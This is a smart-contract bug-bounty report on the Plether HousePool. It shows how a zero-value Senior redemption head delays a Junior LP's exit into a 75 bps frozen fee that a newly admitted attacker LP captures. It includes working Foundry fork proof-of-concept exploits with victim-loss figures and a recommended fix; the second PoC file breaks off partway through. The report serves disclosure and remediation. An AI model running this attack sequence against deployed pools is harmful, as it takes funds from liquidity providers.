# \#99756 [SC-Critical] A zero-value Senior head defers a Junior exit while admitting a new Junior LP

**Submitted on Nov 15th 2026 at 05:48:06 UTC by @unineko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99756
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

**Severity: Critical — direct theft of user funds under the [Plether competition scope](https://immunefi.com/audit-competition/plether/scope/).** After funding a payable Senior redemption head, `HousePool._fundRedemptionPhase()` leaves a subsequent zero-value Senior head queued. That Senior backlog skips an already mature and fundable Junior redemption, but the same call activates a new attacker-owned Junior deposit. If the next settlement is made after the scheduled `oracleFrozen` boundary, the victim's exit pays the release's 75 bps Junior frozen fee. In a matched deployed-code fork comparison, the victim receives **749,999.999986 USDG less** than in the no-dust live-settlement control, while the new Junior LP receives **375,208.615977 USDG more** on its eventual exit.

## Finding Description

At frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, [`HousePool._fundRedemptionPhase()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L944-L1027) prices each matured head against its phase snapshot. When the quote is zero after any earlier Senior shares have been funded, [the `phase.fundedShares != 0` branch](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L970) breaks before `refundRedeemEpochRemainder()`. The head remains queued and `phase.backlog` becomes true. This guard protects a head that is zero at the frozen pre-burn quote but positive under the canonical post-burn price, as the [committed regression test](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/lp/HousePoolRedemptionPhaseGuard.t.sol#L234-L273) demonstrates. Finding 10 uses a one-share head that quotes zero **both before and after** the preceding burn; it is safe to refund, but the branch does not check its post-burn value.

The [Senior-backlog branch](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L854-L925) then skips Junior redemption funding. Only one Senior epoch was processed, below the 16-epoch work cap, so `seniorWorkCapHit` is false and the function continues to the Junior deposit phase. It can activate the attacker's mature Junior deposit while the victim's earlier mature exit remains unfunded. Without the zero-value Senior head, the same live call funds the victim before the new LP is activated.

The PoC stages the payable Senior request in one epoch and the one-share Senior request in the next, because requests within an epoch aggregate into one head. On Friday 2026-11-06, the payable Senior head matures at 20:00 UTC; the dust Senior head, victim Junior redemption, and attacker Junior deposit mature at 21:00 UTC. A public settlement at 21:59:59 funds the payable Senior head, leaves the dust queued, skips the victim, and activates the attacker deposit. A second settlement at the 22:00 `oracleFrozen` boundary refunds the dust and funds the victim. The [fee selector](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1147-L1155) now applies 75 bps to the Junior redemption. Because the Pool removes only the net funded amount from Junior principal, the fee value stays with surviving Junior shares, including the attacker shares. The attacker later redeems after the market reopens.

The defective branch is separate from the previously documented queue and fee behavior. [Cecuro MED-24](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=57), acknowledged without a code change in [PR #123](https://github.com/Plether-Fi/plether-core/pull/123), concerns **16 refunded zero-payout epochs** consuming the work budget. Here **one unrefunded head that remains zero after the Senior burn** causes the skip while `seniorProcessedEpochs == 1`, below the cap, and Junior entry proceeds. MED-24's proposed counter change does not alter the `fundedShares != 0` branch. The [earlier frozen-fee scan](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L497-L540) describes settlement-time fee application and retained value for continuing LPs. Finding 10 identifies the distinct upstream defect that delays an otherwise fundable Junior exit in a live call **while admitting a new Junior LP**; fixing the still-zero Senior-head classification removes this path without changing the fee policy.

## Impact Explanation

The matched deployed-code fork branches claim actual six-decimal USDG into the modeled wallets. The no-dust live branch pays the 100,000,000-USDG Junior victim **99,999,999.998091 USDG**. The dust-induced frozen branch pays **99,249,999.998105 USDG**, a **749,999.999986-USDG** shortfall against that control. The attacker's one-USDG Junior deposit later returns **375,209.615748 USDG** instead of **0.999771 USDG**, an incremental **375,208.615977 USDG**. After its separate one-USDG Senior request is paid, the attacker's total cash exceeds both nominal deposits by **375,208.616697 USDG** before transaction costs. The remainder of the fee stays in Junior backing for other surviving shares; the PoC does not claim it into a seed-holder wallet.

The first fork constructs an independent 100-million-USDG Junior holder on the release's two-seed state and tests that holder's full exit. A second fork at block `329173378` retains the deployed Junior liquidity, open positions, and a pre-existing independent Junior LP. When that LP requests a partial exit of **20 million Junior shares** and the attacker adds **1 million USDG** of Junior capital, the no-dust branch pays the LP **20,199,677.777077 USDG** and the dust-delayed frozen branch pays **20,048,180.188277 USDG**: a **151,497.588800-USDG** cash difference. The LP retains Junior shares in this partial-exit case, whose book value rises by **147,839.908305 USDG**, leaving **3,657.680495 USDG** of net book-value loss. The attacker receives **1,813.428647 USDG** more Junior exit cash than in the no-dust control. Both forks exercise the same zero-head ordering defect in matched counterfactual states.

A third branch makes one **additional live settlement** immediately after the dust-induced stall. It refunds the dust and restores the victim's cash to the no-dust amount. The attack therefore requires the first call to be the last successful live settlement before the frozen boundary.

## Likelihood Explanation

The required state is a payable Senior head followed by a separately queued zero-quote one-share head, an independent mature and fundable Junior exit, a mature attacker Junior entry, sufficient Pool cash and Senior-ratio headroom, and a last successful live settlement immediately before Friday's 22:00 UTC frozen transition. An additional successful live settlement after the dust-induced stall clears the head and funds the victim at the live price, as the rescue control demonstrates. In the first PoC's empty position book, public Pool calls suffice. With open positions, the live call uses the public Router and a current Pyth basket; the supplemental fork exercises that route with a mocked external feed. No privileged keeper or Pool role is required.

## Recommendation

When a zero-quote Senior head follows a funded head, reprice it using the canonical post-burn Senior principal and share supply. If it is still zero, refund and advance it in the same call; if it is positive, retain the existing deferral so a newly valuable request is not incorrectly refunded. Regression tests should cover both quote outcomes, Junior exit and entry in the same epoch, and a frozen-state transition.


## Proof of Concept

## Proof of Concept

The standalone [Finding 10 fork PoC](../../packages/perps/test/perps/finding10_poc.t.sol) pins Arbitrum Sepolia block `323664343` after v2.0.0 activation. It checks deployed Pool, Engine, tranche-vault, and USDG runtime hashes and the release's 40-million-USDG Senior cap, 80% Senior share limit, and 75 bps Junior frozen fee. The Pool, Engine, and vaults remain deployed code. The test uses the release's mintable MockUSDG to fund the modeled LPs and a local ArbSys shim for Arbitrum block-number semantics. It branches from one staged state into dust, no-dust, and extra-live-pass controls, then claims victim and attacker USDG. From `packages/perps`, run with an archive-capable Arbitrum Sepolia RPC:

```sh
FINDING10_FORK_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test --match-path test/perps/finding10_poc.t.sol -vv
```

The focused fork test passes **1/1**, including on a clean checkout of the frozen commit with only this PoC file added. Selected verified output, in **six-decimal USDG atoms**:

```text
[PASS] testFinding10_ZeroSeniorDustHeadTransfersVictimFrozenFeeToAttacker()
controlVictimCash 99999999998091
delayedVictimCash 99249999998105
victimCashLoss 749999999986
controlAttackerJuniorCash 999771
delayedAttackerJuniorCash 375209615748
attackerExtraJuniorCash 375208615977
attackerSeniorCash 1000949
attackerNetAfterBothPrincipals 375208616697
rescuedVictimCash 99999999998091
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {Test, console2} from "forge-std/Test.sol";

interface IFinding10ForkUSDG is IERC20 {

    function mint(
        address to,
        uint256 amount
    ) external;

}

/// @dev Foundry's local fork does not implement ArbSys at address(100). This shim returns the fork's
///      rolled block number; it replaces only the chain precompile, never a scoped Plether contract.
contract Finding10ForkArbSys {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

/// @notice A zero-value Senior head moves a mature Junior redemption across the frozen fee boundary.
/// @dev Forks the seed-only activated release; no in-scope contract is deployed, replaced, or storage-written.
///      The release settlement token is freely mintable MockUSDG, used only to create LP starting balances.
///      No oracle mock is needed: the deployed Pool permits no-position settlement without a mark.
///      From packages/perps, run:
///      FINDING10_FORK_RPC_URL=<Arbitrum-Sepolia-archive-RPC> FOUNDRY_TEST=test/perps forge test \
///        --match-path test/perps/finding10_poc.t.sol -vv --ignored-error-codes 6335 \
///        -o /tmp/plether-f10-out --cache-path /tmp/plether-f10-cache
contract Finding10StandaloneForkPoc is Test {

    uint256 private constant FORK_BLOCK = 323_664_343;
    uint256 private constant START_TIME = 1_793_620_800; // Monday 2026-11-02 12:00 UTC.
    uint256 private constant FREEZE_START = 1_794_002_400; // Friday 2026-11-06 22:00 UTC, 17:00 New York.
    // Requests made inside the final five minutes before an hour roll into the following epoch.
    uint256 private constant FIRST_REQUEST_TIME = FREEZE_START - 2 hours - 5 minutes - 1;
    uint256 private constant SECOND_REQUEST_TIME = FREEZE_START - 1 hours - 5 minutes - 1;
    uint256 private constant LIVE_REOPEN = 1_794_178_800; // Sunday 2026-11-08 23:00 UTC, past FAD lag.

    uint256 private constant VICTIM_CAPITAL = 100_000_000e6;
    uint256 private constant JUNIOR_ATTACK_CAPITAL = 1e6;
    uint256 private constant SENIOR_ATTACK_CAPITAL = 1e6;

    address private constant VICTIM = address(0xB771C);
    address private constant ATTACKER = address(0xA771C);
    address private constant SENIOR_ATTACKER = address(0x5E710);
    address private constant SENIOR_DUST = address(0xD057);
    address private constant KEEPER = address(0xB0B0);

    address private constant USDG_ADDRESS = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address private constant ENGINE_ADDRESS = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address private constant POOL_ADDRESS = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address private constant SENIOR_ADDRESS = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address private constant JUNIOR_ADDRESS = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;

    IFinding10ForkUSDG private usdg = IFinding10ForkUSDG(USDG_ADDRESS);
    CfdEngine private engine = CfdEngine(ENGINE_ADDRESS);
    HousePool private pool = HousePool(POOL_ADDRESS);
    TrancheVault private seniorVault = TrancheVault(SENIOR_ADDRESS);
    TrancheVault private juniorVault = TrancheVault(JUNIOR_ADDRESS);

    struct Stage {
        uint256 seniorHead;
        uint256 victimHead;
        uint256 attackerDepositHead;
        uint256 victimShares;
    }

    struct Outcome {
        uint256 victimCash;
        uint256 attackerJuniorCash;
        uint256 attackerSeniorCash;
        uint256 liveVictimQuote;
    }

    function setUp() public {
        string memory rpc = vm.envOr("FINDING10_FORK_RPC_URL", string(""));
        require(bytes(rpc).length != 0, "FINDING10_FORK_RPC_URL archive RPC required");
        vm.createSelectFork(rpc, FORK_BLOCK);
        assertEq(block.chainid, 421_614, "Arbitrum Sepolia fork");
        vm.etch(address(100), type(Finding10ForkArbSys).runtimeCode);

        assertEq(USDG_ADDRESS.codehash, 0x12233a5f6b0abf6a0f8447e56f9507afdd142a78cc42ebb0d041a3997bd299f6);
        assertEq(ENGINE_ADDRESS.codehash, 0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b);
        assertEq(POOL_ADDRESS.codehash, 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957);
        assertEq(SENIOR_ADDRESS.codehash, 0x1ef72eae70097e0207bbe8b4399d0b0e79910c40d6665a42f2c933b037355d8a);
        assertEq(JUNIOR_ADDRESS.codehash, 0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf);
        assertTrue(pool.isTradingActive(), "deployed release is activated");
        assertEq(pool.seniorPrincipal(), 1e6, "release Senior seed only");
        assertEq(pool.juniorPrincipal(), 1e6, "release Junior seed only");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share limit");
        assertEq(pool.juniorFrozenLpFeeBps(), 75, "release Junior frozen fee");
        assertFalse(pool.lpEpochSettlementPaused(), "LP settlement is live");
        ICfdEngineTypes.TerminalNavSnapshot memory nav = engine.terminalNavSnapshot();
        assertFalse(nav.hasOpenPositions, "public Pool route needs no Router mark");

        _advanceTo(START_TIME);
        usdg.mint(VICTIM, VICTIM_CAPITAL);
        usdg.mint(ATTACKER, JUNIOR_ATTACK_CAPITAL);
        usdg.mint(SENIOR_ATTACKER, SENIOR_ATTACK_CAPITAL);
        _fund(VICTIM, juniorVault, VICTIM_CAPITAL);
        _fund(SENIOR_ATTACKER, seniorVault, SENIOR_ATTACK_CAPITAL);

        uint256 unlock = seniorVault.lastDepositTime(SENIOR_ATTACKER) + seniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlock) {
            _advanceTo(unlock);
        }
        vm.prank(SENIOR_ATTACKER);
        seniorVault.transfer(SENIOR_DUST, 1);
        assertEq(seniorVault.balanceOf(SENIOR_DUST), 1);
    }

    function testFinding10_ZeroSeniorDustHeadTransfersVictimFrozenFeeToAttacker() public {
        Stage memory stage = _stage();
        uint256 checkpoint = vm.snapshotState();
        Outcome memory delayed = _play(stage, true, false);
        assertTrue(vm.revertToState(checkpoint), "restore identical deployed state and LP requests");
        Outcome memory control = _play(stage, false, false);
        assertTrue(vm.revertToState(checkpoint), "restore again for a live rescue control");
        Outcome memory rescued = _play(stage, true, true);

        uint256 victimLoss = control.victimCash - delayed.victimCash;
        uint256 attackerExtra = delayed.attackerJuniorCash - control.attackerJuniorCash;
        uint256 attackerNet =
            delayed.attackerJuniorCash + delayed.attackerSeniorCash - JUNIOR_ATTACK_CAPITAL - SENIOR_ATTACK_CAPITAL;
        assertEq(delayed.attackerSeniorCash, control.attackerSeniorCash, "Senior claim is unchanged by dust");
        assertEq(control.victimCash, delayed.liveVictimQuote, "the dust alone defers the live victim quote");
        assertEq(rescued.victimCash, control.victimCash, "a second live pass eliminates victim loss");
        assertGt(victimLoss, 740_000e6, "victim loses nearly the 75 bps frozen fee");
        assertGt(attackerExtra, 300_000e6, "one-USDG Junior entrant captures material cash");
        assertGt(attackerNet, 300_000e6, "profit remains after both USDG principals are returned");

        // The live fork's Junior seed has borne Senior coupon before these deposits.
        // One USDG mints slightly more shares for the attacker than the seed holds,
        // making its fee share slightly greater than one half; this is not a second fee source.
        console2.log("controlVictimCash", control.victimCash);
        console2.log("delayedVictimCash", delayed.victimCash);
        console2.log("victimCashLoss", victimLoss);
        console2.log("controlAttackerJuniorCash", control.attackerJuniorCash);
        console2.log("delayedAttackerJuniorCash", delayed.attackerJuniorCash);
        console2.log("attackerExtraJuniorCash", attackerExtra);
        console2.log("attackerSeniorCash", delayed.attackerSeniorCash);
        console2.log("attackerNetAfterBothPrincipals", attackerNet);
        console2.log("rescuedVictimCash", rescued.victimCash);
    }

    function _stage() private returns (Stage memory stage) {
        _advanceTo(FIRST_REQUEST_TIME);
        uint256 seniorShares = seniorVault.balanceOf(SENIOR_ATTACKER);
        vm.prank(SENIOR_ATTACKER);
        stage.seniorHead = seniorVault.requestRedeem(seniorShares, SENIOR_ATTACKER, SENIOR_ATTACKER);
        assertEq(pool.lpEpochStart(stage.seniorHead), FREEZE_START - 2 hours, "payable Senior matures first");

        // The victim appears only in the later epoch, alongside the attacker's Senior dust request.
        _advanceTo(SECOND_REQUEST_TIME);
        stage.victimShares = juniorVault.balanceOf(VICTIM);
        vm.prank(VICTIM);
        stage.victimHead = juniorVault.requestRedeem(stage.victimShares, VICTIM, VICTIM);
        vm.startPrank(ATTACKER);
        usdg.approve(address(juniorVault), JUNIOR_ATTACK_CAPITAL);
        stage.attackerDepositHead = juniorVault.requestDeposit(JUNIOR_ATTACK_CAPITAL, ATTACKER, ATTACKER);
        vm.stopPrank();
        assertEq(stage.victimHead, stage.attackerDepositHead, "victim exit and attacker entry mature together");
        assertEq(pool.lpEpochStart(stage.victimHead), FREEZE_START - 1 hours);
    }

    function _play(
        Stage memory stage,
        bool queueDust,
        bool secondLivePass
    ) private returns (Outcome memory outcome) {
        uint256 dustHead;
        if (queueDust) {
            vm.prank(SENIOR_DUST);
            dustHead = seniorVault.requestRedeem(1, SENIOR_DUST, SENIOR_DUST);
            assertGt(dustHead, stage.seniorHead, "payable Senior head is one epoch earlier");
            assertEq(dustHead, stage.victimHead, "dust and victim mature in the same later hour");
            assertEq(seniorVault.estimateRedeemAssets(1), 0, "Senior dust has zero USDG quote");
        }

        _advanceTo(FREEZE_START - 1);
        assertFalse(engine.isOracleFrozen(), "first settlement is still live");
        if (queueDust) {
            assertEq(seniorVault.estimateRedeemAssets(1), 0, "dust is still zero at live settlement");
        }
        IHousePool.LpEpochSettlementResult memory first = _settle();
        assertGt(first.seniorFundedAssets, 0, "attacker's payable Senior head funds");
        assertEq(first.juniorDepositAssets, JUNIOR_ATTACK_CAPITAL, "attacker Junior entry activates");
        uint256 attackerShares = _claimDeposit(ATTACKER, juniorVault, stage.attackerDepositHead);
        assertGt(
            attackerShares,
            juniorVault.balanceOf(juniorVault.seedReceiver()),
            "pre-existing coupon makes one-USDG entrant slightly larger than seed"
        );
        uint256 seniorFunded = seniorVault.claimableRedeemRequest(stage.seniorHead, SENIOR_ATTACKER);
        uint256 seniorBalanceBefore = usdg.balanceOf(SENIOR_ATTACKER);
        vm.prank(SENIOR_ATTACKER);
        outcome.attackerSeniorCash =
            seniorVault.claimRedeem(stage.seniorHead, seniorFunded, SENIOR_ATTACKER, SENIOR_ATTACKER);
        assertEq(
            usdg.balanceOf(SENIOR_ATTACKER) - seniorBalanceBefore,
            outcome.attackerSeniorCash,
            "actual Senior USDG received"
        );

        if (queueDust) {
            assertTrue(first.seniorBacklog, "the worthless Senior head remains queued");
            assertTrue(first.juniorBacklog, "the victim is skipped despite available cash");
            assertEq(first.seniorProcessedEpochs, 1, "one Senior epoch processed, below the 16-epoch cap");
            (uint256 pendingHead, uint256 pendingShares) = seniorVault.getMaturedRedeemHead(first.cutoffEpoch);
            assertEq(pendingHead, dustHead, "the zero-value Senior head remains first");
            assertEq(pendingShares, 1, "the one-share head remains unprocessed");
            assertEq(seniorVault.estimateRedeemAssets(1), 0, "dust remains worthless after Senior burn");
            assertEq(first.juniorFundedShares, 0);
            outcome.liveVictimQuote = juniorVault.estimateRedeemAssets(stage.victimShares);
            if (secondLivePass) {
                IHousePool.LpEpochSettlementResult memory second = _settle();
                assertEq(second.juniorFundedShares, stage.victimShares, "live rescue funds victim");
            } else {
                // Keep the one-second boundary step explicit on an Arbitrum fork.
                vm.warp(FREEZE_START);
                vm.roll(block.number + 1);
                assertTrue(engine.isOracleFrozen(), "second settlement enters frozen regime");
                IHousePool.LpEpochSettlementResult memory second = _settle();
                assertEq(second.juniorFundedShares, stage.victimShares, "frozen pass funds victim");
            }
            assertEq(seniorVault.refundableRedeemRequest(dustHead, SENIOR_DUST), 1);
        } else {
            assertFalse(first.seniorBacklog, "no dust leaves Senior queue empty");
            assertEq(first.juniorFundedShares, stage.victimShares, "no-dust control pays victim live");
        }

        uint256 fundedVictim = juniorVault.claimableRedeemRequest(stage.victimHead, VICTIM);
        uint256 victimBalanceBefore = usdg.balanceOf(VICTIM);
        vm.prank(VICTIM);
        outcome.victimCash = juniorVault.claimRedeem(stage.victimHead, fundedVictim, VICTIM, VICTIM);
        assertEq(usdg.balanceOf(VICTIM) - victimBalanceBefore, outcome.victimCash, "actual victim USDG received");

        _advanceTo(LIVE_REOPEN);
        assertFalse(engine.isOracleFrozen(), "FX market has reopened");
        vm.prank(ATTACKER);
        uint256 attackerExit = juniorVault.requestRedeem(attackerShares, ATTACKER, ATTACKER);
        _advanceTo(pool.lpEpochStart(attackerExit));
        IHousePool.LpEpochSettlementResult memory finalPass = _settle();
        assertEq(finalPass.juniorFundedShares, attackerShares, "attacker fully exits");
        uint256 fundedAttacker = juniorVault.claimableRedeemRequest(attackerExit, ATTACKER);
        vm.prank(ATTACKER);
        outcome.attackerJuniorCash = juniorVault.claimRedeem(attackerExit, fundedAttacker, ATTACKER, ATTACKER);
        assertEq(usdg.balanceOf(ATTACKER), outcome.attackerJuniorCash, "actual attacker USDG received");
    }

    function _fund(
        address lp,
        TrancheVault vault,
        uint256 assets
    ) private {
        vm.startPrank(lp);
        usdg.approve(address(vault), assets);
        uint256 id = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        _advanceTo(pool.lpEpochStart(id));
        _settle();
        assertEq(vault.claimableDepositRequest(id, lp), assets);
        _claimDeposit(lp, vault, id);
    }

    function _claimDeposit(
        address lp,
        TrancheVault vault,
        uint256 id
    ) private returns (uint256 shares) {
        uint256 assets = vault.claimableDepositRequest(id, lp);
        vm.prank(lp);
        shares = vault.claimDeposit(id, assets, lp, lp);
    }

    function _settle() private returns (IHousePool.LpEpochSettlementResult memory result) {
        vm.prank(KEEPER);
        result = pool.settleLpEpoch(0, 0);
    }

    function _advanceTo(
        uint256 timestamp
    ) private {
        vm.warp(timestamp);
        vm.roll(block.number + 1);
    }

}
```

The [recent-state supplemental fork PoC](../../packages/perps/test/perps/finding10_live_poc.t.sol) pins block `329173378`, preserves the deployed LP balances and open positions, and tests the same dust, no-dust, and second-live-pass branches with a pre-existing Junior LP as the requesting holder. It replaces only the external Pyth contract and local ArbSys precompile; the public Router supplies a six-feed mark for live settlement. The holder's request, attacker funding, market data, and future timestamps are modeled on the fork. From `packages/perps`:

```sh
FINDING10_LIVE_FORK_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test --match-path test/perps/finding10_live_poc.t.sol -vv
```

The supplemental test passes **1/1**, including on a clean checkout of the frozen commit with only this PoC file added. It values the partially exiting holder's retained shares with `convertToAssets` at the same settlement point in each branch; this is a book-value comparison, not a second cash claim. Its extra live-pass control restores both the holder's cash and retained-share value to the no-dust control. Selected output, in six-decimal USDG atoms:

```text
[PASS] testFinding10_RecentOwnerPartialExitSensitivity()
victimCashLoss 151497588800
victimNetLossAfterRetainedShares 3657680495
attackerExtraJuniorCash 1813428647
attackerNetAfterBothPrincipals 1752420924
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Test, Vm, console2} from "forge-std/Test.sol";

interface IFinding10LiveForkUSDG is IERC20 {

    function mint(
        address to,
        uint256 amount
    ) external;

}

/// @dev Foundry's local fork does not implement ArbSys at address(100). This shim returns the fork's
///      rolled block number; it replaces only the chain precompile, never a scoped Plether contract.
contract Finding10LiveForkArbSys {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

/// @notice Sensitivity check for Finding 10 against recent deployed Pool and existing LP positions.
/// @dev Keeps in-scope contracts and existing tranche liquidity; only external Pyth and ArbSys are mocked.
contract Finding10LiveForkPoc is Test {

    uint256 private constant FORK_BLOCK = 329_173_378;
    uint256 private constant START_TIME = 1_794_783_600; // Sunday 2026-11-15 23:00 UTC.
    uint256 private constant FREEZE_START = 1_795_212_000; // Friday 2026-11-20 22:00 UTC.
    // Requests made inside the final five minutes before an hour roll into the following epoch.
    uint256 private constant FIRST_REQUEST_TIME = FREEZE_START - 2 hours - 5 minutes - 1;
    uint256 private constant SECOND_REQUEST_TIME = FREEZE_START - 1 hours - 5 minutes - 1;
    uint256 private constant LIVE_REOPEN = 1_795_388_400; // Sunday 2026-11-22 23:00 UTC.

    uint256 private constant VICTIM_REDEEM_SHARES = 20_000_000e9;
    uint256 private constant JUNIOR_ATTACK_CAPITAL = 1_000_000e6;
    uint256 private constant SENIOR_ATTACK_CAPITAL = 1e6;

    address private constant VICTIM = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B;
    address private constant ATTACKER = address(0xA771C);
    address private constant SENIOR_ATTACKER = address(0x5E710);
    address private constant SENIOR_DUST = address(0xD057);
    address private constant KEEPER = address(0xB0B0);

    address private constant USDG_ADDRESS = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address private constant ENGINE_ADDRESS = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address private constant POOL_ADDRESS = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address private constant SENIOR_ADDRESS = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address private constant JUNIOR_ADDRESS = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address private constant ROUTER_ADDRESS = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address private constant PYTH_ADDRESS = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    bytes32[6] private feedIds = [
        bytes32(0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b),
        bytes32(0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52),
        bytes32(0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1),
        bytes32(0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca),
        bytes32(0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676),
        bytes32(0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8)
    ];
    uint256[6] private basePrices = [uint256(117_500_000), 638_000, 134_480_000, 72_880_000, 10_860_000, 126_100_000];

    IFinding10LiveForkUSDG private usdg = IFinding10LiveForkUSDG(USDG_ADDRESS);
    CfdEngine private engine = CfdEngine(ENGINE_ADDRESS);
    HousePool private pool = HousePool(POOL_ADDRESS);
    TrancheVault private seniorVault = TrancheVault(SENIOR_ADDRESS);
    TrancheVault private juniorVault = TrancheVault(JUNIOR_ADDRESS);
    OrderRouter private router = OrderRouter(ROUTER_ADDRESS);

    struct Stage {
        uint256 seniorHead;
        uint256 victimHead;
        uint256 attackerDepositHead;
        uint256 victimShares;
    }

    struct Outcome {
        uint256 victimCash;
        uint256 victimRetainedShares;
        uint256 victimRetainedShareValue;
        uint256 attackerJuniorCash;
        uint256 attackerSeniorCash;
        uint256 liveVictimQuote;
    }

    function setUp() public {
        string memory rpc = vm.envOr("FINDING10_LIVE_FORK_RPC_URL", string(""));
        require(bytes(rpc).length != 0, "FINDING10_LIVE_FORK_RPC_URL archive RPC required");
        vm.createSelectFork(rpc, FORK_BLOCK);
        assertEq(block.chainid, 421_614, "Arbitrum Sepolia fork");
        vm.etch(address(100), type(Finding10LiveForkArbSys).runtimeCode);

        assertEq(USDG_ADDRESS.codehash, 0x12233a5f6b0abf6a0f8447e56f9507afdd142a78cc42ebb0d041a3997bd299f6);
        assertEq(ENGINE_ADDRESS.codehash, 0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b);
        assertEq(POOL_ADDRESS.codehash, 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957);
        assertEq(SENIOR_ADDRESS.codehash, 0x1ef72eae70097e0207bbe8b4399d0b0e79910c40d6665a42f2c933b037355d8a);
        assertEq(JUNIOR_ADDRESS.codehash, 0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf);
        assertTrue(pool.isTradingActive(), "deployed release is activated");
        assertGt(pool.seniorPrincipal(), 11_000_000e6, "existing Senior liquidity retained");
        assertGt(pool.juniorPrincipal(), 100_000_000e6, "existing Junior liquidity retained");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share limit");
        assertEq(pool.juniorFrozenLpFeeBps(), 75, "release Junior frozen fee");
        assertFalse(pool.lpEpochSettlementPaused(), "LP settlement is live");
        ICfdEngineTypes.TerminalNavSnapshot memory nav = engine.terminalNavSnapshot();
        assertTrue(nav.hasOpenPositions, "recent open positions retained");

        vm.etch(PYTH_ADDRESS, type(MockPyth).runtimeCode);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH_ADDRESS, bytes32(slot), bytes32(0));
        }
        _advanceTo(START_TIME);
        vm.prank(KEEPER);
        router.updateMarkPrice(_basket(START_TIME, START_TIME - 1));
        assertGt(juniorVault.balanceOf(VICTIM), VICTIM_REDEEM_SHARES);
        usdg.mint(ATTACKER, JUNIOR_ATTACK_CAPITAL);
        usdg.mint(SENIOR_ATTACKER, SENIOR_ATTACK_CAPITAL);
        _fund(SENIOR_ATTACKER, seniorVault, SENIOR_ATTACK_CAPITAL);

